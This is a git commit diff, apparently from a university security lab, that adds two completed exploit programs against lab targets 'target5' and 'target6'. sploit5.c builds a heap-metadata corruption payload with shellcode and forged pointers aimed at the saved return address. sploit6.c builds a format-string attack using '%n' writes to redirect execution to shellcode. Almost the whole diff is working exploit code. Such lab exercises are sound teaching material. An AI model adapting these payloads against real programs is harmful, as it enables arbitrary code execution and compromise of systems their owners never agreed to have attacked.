9b146f79b4a35d8a695c2a873d110b20a2867408
Sebastian Liu <ll57@cs.washington.edu>
2024-04-16 07:39:30 +0000

    target5&6 sploited

--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -5,13 +5,33 @@
 #include "shellcode.h"
 
 #define TARGET "/lab1/bin/target5"
+#define NOOP 0x90                 // no-op instruction
+#define BUFLEN 120                // target buffer length
+#define L_LEN 4                   // byte length of left pointer
+#define R_LEN 4                   // byte length of right pointer
+#define NULL_LEN 1                // byte length for null byte
+#define BUF_START 0xffffdef6       // addr of the start of the buffer (p)
+#define ADDR_RET_ADDR 0xffffdd60  // &RET
+#define JMP_SHORT_0x6 "\xeb\x06"  // instruction for jump 6 bytes
+#define FREE_BIT_BYTE 0x01
 
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char buf[BUFLEN * 2];
+
+  memset(buf, NOOP, sizeof(buf) - 1);
+  buf[BUFLEN * 2 - 1] = '\0';
+
+  memcpy(buf, JMP_SHORT_0x6, sizeof(JMP_SHORT_0x6) - 1);
+  buf[4] = FREE_BIT_BYTE;
+  memcpy(buf + L_LEN + R_LEN, shellcode, sizeof(shellcode) - 1);
+  *(unsigned int*) (buf + BUFLEN) = BUF_START;
+  *(unsigned int*) (buf + BUFLEN + L_LEN) = ADDR_RET_ADDR;
+
+  args[0] = TARGET; args[1] = buf; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
--- sploits/sploit6.c
+++ sploits/sploit6.c
@@ -5,13 +5,36 @@
 #include "shellcode.h"
 
 #define TARGET "/lab1/bin/target6"
+#define NOOP 0x90                 // no-op instruction
+#define BUFLEN 352                // target buffer length
+#define SHELL_START 0xffffdede     // addr of the start of the buffer &buf[88]
+#define SHELL_START_IDX 88
+#define ADDR_RET_BYTE0 0xffffdcf0
+#define ADDR_RET_BYTE1 0xffffdcf1
+#define ADDR_RET_BYTE2 0xffffdcf2
+#define ADDR_RET_BYTE3 0xffffdcf3
+#define ADDR_LEN 4
 
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char buf[BUFLEN];
+
+  memset(buf, NOOP, sizeof(buf) - 1);
+  buf[BUFLEN - 1] = '\0';
+
+  memcpy(buf + 88, shellcode, sizeof(shellcode) - 1);
+
+  *(unsigned int*) (buf + ADDR_LEN) = ADDR_RET_BYTE0;
+  *(unsigned int*) (buf + ADDR_LEN * 2) = ADDR_RET_BYTE1;
+  *(unsigned int*) (buf + ADDR_LEN * 4) = ADDR_RET_BYTE2;
+  *(unsigned int*) (buf + ADDR_LEN * 5) = ADDR_RET_BYTE3;
+  char *format_byte_one = "%198c%n%n%33c%n%n";
+  memcpy(buf + ADDR_LEN * 6, format_byte_one, strlen(format_byte_one));
+
+  args[0] = TARGET; args[1] = buf; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
